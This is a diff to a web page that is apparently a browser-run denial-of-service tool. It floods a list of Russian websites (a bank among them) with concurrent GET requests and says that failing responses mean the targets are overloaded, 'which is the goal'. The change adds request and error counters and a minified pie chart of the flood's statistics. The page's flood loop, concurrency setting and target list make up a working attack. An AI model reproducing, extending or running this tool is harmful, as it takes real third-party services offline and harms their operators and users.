@@ -137,6 +137,10 @@
     <h3>Session Status</h3>
     <p>The number of GET requests and error responses for each targeted website is shown below. Failure to fetch is normal! That means their servers are overloaded and dropping
         packets - which is the goal!</p>
+    <p>Total number of requests: <span id="totalrequests">0</span></p>
+    <p>Total number of errors: <span id="totalerrors">0</span></p>
+    <canvas width="200" height="200" id="statsChart"></canvas>
+    <br>
     <button type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
     </div>
 
@@ -147,8 +151,7 @@
 
     <p class="footer">Reformated from https://stop-russian-desinformation.near.page</p>
 
-    <script>
-        
+    <script>        
         // target list
         var targets = {
             'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -366,6 +369,8 @@
         var CONCURRENCY_LIMIT = 200;
         var queue = [];
         var attack = true;
+        var totalrequests = 0;
+        var totalerrors = 0;
 
         function togglePause () {
             if (attack) {
@@ -411,14 +416,17 @@
                                 return;
                             }
                             targets[target].number_of_errored_responses++;
-                            targets[target].error_message = error.message
+                            targets[target].error_message = error.message;
+                            totalerrors++;
                         })
                         .then((response) => {
                             if (response && !response.ok) {
                                 targets[target].number_of_errored_responses++;
-                                targets[target].error_message = response.statusText
+                                targets[target].error_message = response.statusText;
+                                totalerrors++;
                             }
                             targets[target].number_of_requests++;
+                            totalrequests++;
                         })
                         .finally(function() {
                             updateTargetDisplay(n);
@@ -435,6 +443,8 @@
             var errors_cell = document.querySelector(`#target${n} .errors`);
             requests_cell.innerText = number_of_requests;
             errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
         }
 
         // Shuffle array order before starting
@@ -460,6 +470,15 @@
         for (var i=0; i<urls.length; i++) {
             flood(urls[i], i);
         }
+        
+        //chart
+        var myCanvas=document.getElementById("statsChart"),ctx=myCanvas.getContext("2d");function drawPieSlice(t,i,a,h,s,n,o){t.fillStyle=o,t.beginPath(),t.moveTo(i,a),t.arc(i,a,h,s,n),t.closePath(),t.fill()}var Piechart=function(t){this.options=t,this.canvas=t.canvas,this.ctx=this.canvas.getContext("2d"),this.colors=t.colors,this.draw=function(){var t=0,i=0;for(var a in this.options.data){var h=this.options.data[a];t+=h}var s=0;for(a in this.options.data){h=this.options.data[a];var n=2*Math.PI*h/t;drawPieSlice(this.ctx,this.canvas.width/2,this.canvas.height/2,Math.min(this.canvas.width/2,this.canvas.height/2),s,s+n,this.colors[i%this.colors.length]),s+=n,i++}for(a in this.options.doughnutHoleSize&&drawPieSlice(this.ctx,this.canvas.width/2,this.canvas.height/2,this.options.doughnutHoleSize*Math.min(this.canvas.width/2,this.canvas.height/2),0,2*Math.PI,"#FFD600"),s=0,this.options.data){h=this.options.data[a],n=2*Math.PI*h/t;var o=Math.min(this.canvas.width/2,this.canvas.height/2),c=this.canvas.width/2+o/2*Math.cos(s+n/2),e=this.canvas.height/2+o/2*Math.sin(s+n/2);if(this.options.doughnutHoleSize){var v=o*this.options.doughnutHoleSize/2;c=this.canvas.width/2+(v+o/2)*Math.cos(s+n/2),e=this.canvas.height/2+(v+o/2)*Math.sin(s+n/2)}var d=Math.round(100*h/t);this.ctx.fillStyle="white",this.ctx.font="bold 20px Arial",this.ctx.fillText(d+"%",c,e),s+=n}}};
+        //first load chart
+        var myPiechart=new Piechart({canvas:myCanvas,data:{Requests:1,Errors:1},colors:["#bada55","#ff6666"],doughnutHoleSize:.6});
+        //update chart
+        function updateChart(){totalerrors++,ctx.clearRect(0,0,200,200),new Piechart({canvas:myCanvas,data:{Requests:totalrequests,Errors:totalerrors},colors:["#bada55","#ff6666"],doughnutHoleSize:.6}).draw()}
+        setInterval(updateChart, 500);
+        window.onload = myPiechart.draw(); 
     </script>
 </body>
 
